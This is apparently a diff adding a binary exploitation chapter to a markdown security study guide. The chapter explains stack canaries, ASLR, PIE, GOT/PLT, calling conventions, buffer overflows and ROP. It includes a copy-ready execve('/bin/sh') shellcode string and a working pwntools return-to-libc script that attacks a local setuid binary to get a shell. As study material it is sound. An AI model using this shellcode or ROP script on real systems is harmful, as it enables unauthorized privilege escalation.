@@ -18,6 +18,8 @@
 - [Mobile Hacking](#mobile-hacking---android)
   - [Android](#mobile-hacking---android)
   - [iOS](#mobile-hacking---ios)
+- [Binary Exploitation](#binary-exploitation) 
+  - [attacks](#binary-exploitation-attacks)
 
 <br>
 <br>
@@ -2420,3 +2422,354 @@ Countermeasures:
   - Encrypt data using Apple features and third-party tools from McAfee, Good, etc. 
   - Use a passcode of 6 digits or more 
   - Install remote-tracking software to recover a stolen or lost device, or remotely wipe it 
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
+# Binary Exploitation
+
+## Useful Concepts
+### CPU Registers
+Quickly accessible memory locations, available to a computer's processor
+  - Usually consist of a small amount of fast storage, although some registers have specific hardware functions, and may be read-only or write-only
+
+![CPU registers](images/Cpu-reg.png)
+
+Special registers for x86-64:
+  - rbp - base or frame pointer: start of the function frame
+  - rsp - stack pointer: current location in stack, growing downwards 
+  - rip - istruction pointer: points to the next instruction the CPU will execute
+
+Some other registers and their conventional use
+  - rsi - Register source index (source for data copies)
+  - rdi - register destination index (destinastion for data copies)
+  - rcx - typically the index in loops
+
+### Call Stack
+A stack-like data structure:
+  - Stores inmformation about the active subroutines of a computer program
+  - 
+![call stack](images/call-stack.png)
+
+
+### Function Prologue and Epilogue
+**Function prologue** - a few lines of code at the beginning of a function
+  - Prepares the stack and registers for use within the function
+
+**Function epilogue** - appears at the end of the function
+  - Restores the stack and registers to the state they were in before the function was called
+- ![prologue - epilogue](images/pro-epi.png)
+
+## Security Measures
+
+### Stack Canary
+
+A stack canary is a random value 
+  - Put on the stack between the local variables of a function and the saved $rbp register (i.e., the frame pointer) + the function return address  
+  - The value is checked when the function returns
+  - If different from the original, the program is terminated
+
+Canary logic is produced by the compiler. on Linux, canary is always NULL terminated
+
+Stack with canary:
+![canary](images/canary.png)
+
+![canary2](images/canary2.png)
+
+![canary3](images/canary3.png)
+
+
+### Address Space Layout Randomization - ASLR
+
+Developed to prevent exploitation of memory corruption vulnerabilities (Example: Prevent an attacker from reliably jumping to a particular function in memory)
+
+ASLR randomly arranges the address space positions of key data areas of a process, including
+  - the base of the executable
+  - the positions of the stack
+  - heap and libraries
+
+It is implemented by the operating system: Can be expensive and could be turned off on some device.
+
+Codes meaning
+0. No randomisation
+1. Shared libraries, stack, mmap(), VDSO and heap are randomised
+2. Full randomisation: 1. + memory managed through brk() (e.g., program heap)
+
+Examples: 
+![aslr-check](images/aslr_check.png)
+![aslr-check2](images/aslr_check2.png)
+
+### Position Independent Code (PIC) / Position Independent Executable (PIE)
+
+Code that does not depend on being loaded in a particular memory address
+
+PIC is used for shared libraries:
+   - Shared code that can be “loaded” at any location within the linking program's virtual address space
+
+PIC is also used for executable binaries (PIE)
+  - Implemented for hardening purposes
+  - Default on modern Linux distros
+
+![PIE](images/PIE.png)
+
+## Shared Libraries - GOT and PLT
+
+Shared libraries  - Body of PIC, shared by multiple binaries (Libc is an example)
+
+Executables don’t know the location of functions they need in shared libs
+
+The dynamic linker (that is ld.so, for Linux) is responsible for resolving those addresses:
+  - On each function call - aka lazy binding
+  - On program load
+  - On program load w/ RELRO (RELocation Read-Only) - default for modern distros
+
+Dynamic linking is implemented through 
+  - Procedure Linkage Table (PLT)
+  - Global Offset Table (GOT)
+
+These tables work together
+
+### PLT
+Contains a set of stubs or trampolines
+   - Responsible for redirecting control flow to the dynamic linker during the first invocation of a function in the shared library (assuming lazy binding)
+   - Subsequent calls will go to the real function in the shared library
+Each entry in the PLT corresponds to a function in a shared library used by the executable (determined at compile time)
+
+### GOT
+The GOT is a table that contains addresses of global data and functions
+ - Initially, the entries in the GOT point to the corresponding PLT stubs
+
+The first time the dynamic linker resolves the addresses of library functions, it updates the GOT entries with the resolved addresses (assuming lazy binding). From that moment, subsequent call to the same library functions go to the library
+
+![example](images/Dynamic.png)
+
+![example 2](images/Dynamic2.png)
+
+![example 3](images/Dynamic3.png)
+
+![example 4](images/Dynamic4.png)
+
+
+## Calling Conventions
+Describe the interface of called code (e.g., functions) 
+
+It’s part of the ABI (Application Binary Interface)
+  - The order in which atomic (scalar) parameters, or individual parts of a complex parameter, are allocated
+  - How parameters are passed - pushed on the stack, placed in registers, or a mix of both
+  - Which registers the called function must preserve for the caller
+  - How the task of preparing the stack for, and restoring after, a function call is divided between the caller and the callee
+
+![calling](images/Calling-Conventions.png)
+
+![example](images/example_calling.png)
+
+Something useful to know for binary exploitation on amd64 SysV ABI (Linux):
+  - Upon function call, the stack pointer must be aligned to 16 bytes
+  - Some instructions (like MOVAPS) will cause SIGSEGV if the stack is not aligned
+
+## Shellcodes
+Small piece of code used as the payload in the exploitation of a software vulnerability. Written in machine code for the target system (hardware and OS). It typically spawns a shell - but, being arbitrary code, it can for instance:
+  - Create a bind shell with TCP
+  - Create a reverse shell via TCP or UDP
+  - Open the Windows Calculator app
+
+### Syscalls
+
+Syscalls are the Kernel APIs - programmatic way for a program to request a service from the kernel, which controls the core functionalities of the system.
+  - Bridge between a program and the operating system kernel
+  - Each syscall has a number
+
+Calling convention for syscalls follows different rules
+  - Syscalls are wrapped in libc functions, these do follows SysV ABI
+
+Some of them:
+  -  The kernel interface uses rdi, rsi, rdx, r10, r8 and r9 - syscall number in rax
+  -  Invoked via the syscall instruction
+  -  Returning from the syscall, register rax contains the result of the system-call
+     -  A value in the range between -4095 and -1 indicates an error, it is -errno.
+  -  Only values of class INTEGER or class MEMORY are passed to the kernel
+
+Useful Links: [Linux System Call Table for x86_64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) and [Searchable Linux Syscall Table](https://filippo.io/linux-syscall-table/)
+
+![shellcode](images/shellcode.png)
+
+to copy:
+`\x48\xc7\xc0\x3b\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x48\x31\xf6\x48\x31\xd2\x0f\x05`
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
+# Binary Exploitation Attacks
+
+## Stack Based Buffer Overflows
+Happens when a program allows overflowing a buffer created on the stack (i.e., local variables to a function).
+
+We are able to overwrite:
+  + Local variables coming after the overflowed one
+  + Saved frame pointer ($rbp)
+  + Return address of the function
+
+When the function returns, the instruction pointer ($rip) is set to a value we can control (via the overflow):
+  - Controlling the instruction pointer is a central concept of buffer overflow attacks
+
+![buffer over flow](images/bof.png)
+
+Stack canary makes this attack difficult. The canary is checked before returning from the function
+  - If differs from expected value ⇒ the program is aborted
+
+## Executable Stack
+The stack is meant to contain data, but (binary) code is data. A buffer overflow can be used to inject and run (return to) arbitrary code. Assuming that:
+  - The stack memory region is executable - otherwise no code execution 
+  - No stack canary is used - otherwise, can’t control the IP (via return address) (*)
+  - ASLR is off - otherwise, stack base-address is random (**)
+Note: thanks to the popularity of BOs, those conditions are neither the default nor considered good practices on modern Linux distros and compilers
+
+![executable stack](images/executable_stack.png)
+
+![executable stack EXAMPLE](images/example_executable_stack.png)
+
+We want to overwrite the return address of get_user() (green) In this case, instead of (just) overwriting a local variable, we intend to return control to code we inject into the stack
+
+### DE BRUJIN SEQUENCES
+Often we don’t have the source code and it could be difficult/unfeasible to do the exact math of how much padding to use in the payload
+  - Optimizations performed by the compiler might make variables aligned (e.g., to 16 bytes) changing the actual stack layout
+
+We can use sequences of bytes (ASCII in our case), of increasing length,  which never repeat so that when the program crashes, we look at the value of $rip, and we will know where to 
+put the bytes to control the program execution.
+
+We can generate those de Bruijn sequences, with multiple tools:
+
+![examples](images/de_brujin.png)
+
+### NOP SLED
+
+A NOP-sled is a sequence of NOP (No-OPeration) machine instructions (opcode `0x90` on x86)
+   - “Slide” the CPU's instruction execution flow to its final, desired destination whenever the program branches to a memory address anywhere on the slide
+   - Commonly used in software exploits to direct program execution when a branch instruction target is not known precisely (e.g., ASLR is on!)
+
+![nop sled](images/nop.png)
+
+
+## Return Oriented Programming - ROP
+
+A buffer overflow can be used to execute “arbitrary code”. Assuming that:
+   - No stack canary is used - otherwise, can’t control the IP (via return address) (Unless we can read and reconstruct the canary)
+   - ASLR is off - otherwise, code address (libraries and executable) is random (Unless you can learn the address)
+   - There is something interesting to “jump” to, via return address
+     - In other words, we can find all the ROP gadgets we need 
+
+Note: thanks to the popularity of BOs, the first 2 conditions are neither the default nor considered good practices on modern Linux distros and compilers
+
+ROP allows an attacker to execute code in the presence of security defenses - e.g. non-executable stack
+   - ROP is used to hijack program control flow to executes carefully chosen machine instruction sequences called “gadgets”
+   - Gadgets are already present in the machine's memory
+   - Gadgets, typically, end in a return instruction
+
+Chained together, gadgets allow arbitrary operations.
+
+Example gadgets
+
+> pop rdi  
+> ret 
+
+Or
+
+> push rax  
+> push rdi  
+> ret  
+
+## Return to Function
+
+The simplest ROP we can imagine. In this case, the buffer overflow is used “only” to overwrite the return address
+   - The address is set as the address of some interesting function
+     - Or somewhere in its body
+     
+## Return to Libc
+
+if there is nothing interesting in the program, we can return to any function we know the address of:
+   - This includes libraries linked dynamically
+   - Functions in libc are great candidates as libc is almost always needed
+     - Exception: statically linked programs (e.g., Golang)
+
+There are a couple of problems we need to solve
+
+1) How can we learn the address of some interesting function?
+   1) ASLR is off
+   2) The address is somehow leaked by the program
+2) How do we pass arguments to (libc) functions?
+   1)  We “just” need a way to put values in registers before “returning”, following calling conventions
+       - Occasionally, we need to get creative, but typically, we do that by putting the values we need in the stack (via Buffer Overflow) and then by popping the register we need to load the value into
+
+### THE PLAN
+We want to call system(), passing “/bin/sh” as the argument.
+   1. Search any `pop rdi; ret` ROP gadget and put its address on the stack
+   2. Search for `“/bin/sh”` in libc and put its address on the stack
+     - This address will be popped into `rdi` by the previous gadget
+   3. Search for `system()` in libc and put its address on the stack
+     - This address will be returned to via previous `ret` gadget
+
+There is a complication: Upon function call, the stack pointer must be aligned to 16 bytes!
+
+For this specific ROP to work, that means we need to move rsp by 8 bytes
+
+### SOLUTION
+
+1. Search `pop rdi; pop rbp; ret ROP gadget` and Put its address on the stack 
+2. Search for `“/bin/sh”` in libc and Put its address on the stack
+  - This address will be popped into `rdi` by the previous gadget
+3. Put 8 rubbish bytes on the stack
+  - This rubbish will be popped into `rbp` by the previous gadget 
+4. Search for `system()` in libc → Put its address on the stack
+  - This address will be returned to via previous `ret` gadget
+
+![visual plan](images/plan.png)
+
+Code with PWNTOOLS:
+```python
+#!/usr/bin/env python3
+from pwn import asm, context, ELF, log, p64, process, sys
+
+target = "./simple-bo-rop-setuid"
+if len(sys.argv) !=  2:
+  print("Missing LibC base address" )  
+  sys.exit( 1)
+
+context.update(arch= "amd64", os="linux")
+libc = ELF( "/lib/x86_64-linux-gnu/libc.so.6" )
+
+# if ASLR is off, we know this!
+libc.address =  int(sys.argv[ 1], 16)
+system_address = libc.symbols.system
+log.info(f"LibC base adress: { hex(libc.address)}" )
+log.info(f"system() adress: { hex(system_address)}" )
+
+# Stack smashing (str len + caller function's rbp
+# i.e., 8 bytes)
+payload =  b"A" * 0x10 + b"YADAYADA"
+
+# ROP program:
+# system("/bin/sh")
+payload += p64( next(libc.search(asm( "pop rdi;pop rbp;ret"))))
+payload += p64( next(libc.search( b"/bin/sh" )))
+payload += p64( 0)
+payload += p64(system_address)
+
+process = process(target)
+_ = process.recvline_containsS( "What is your name?" , timeout=3)
+
+print("Injecting malicious input" )
+process.sendline(payload)
+_ = process.recvline_containsS( "Hello ", timeout= 3)
+process.clean()
+process.interactive( )
+```
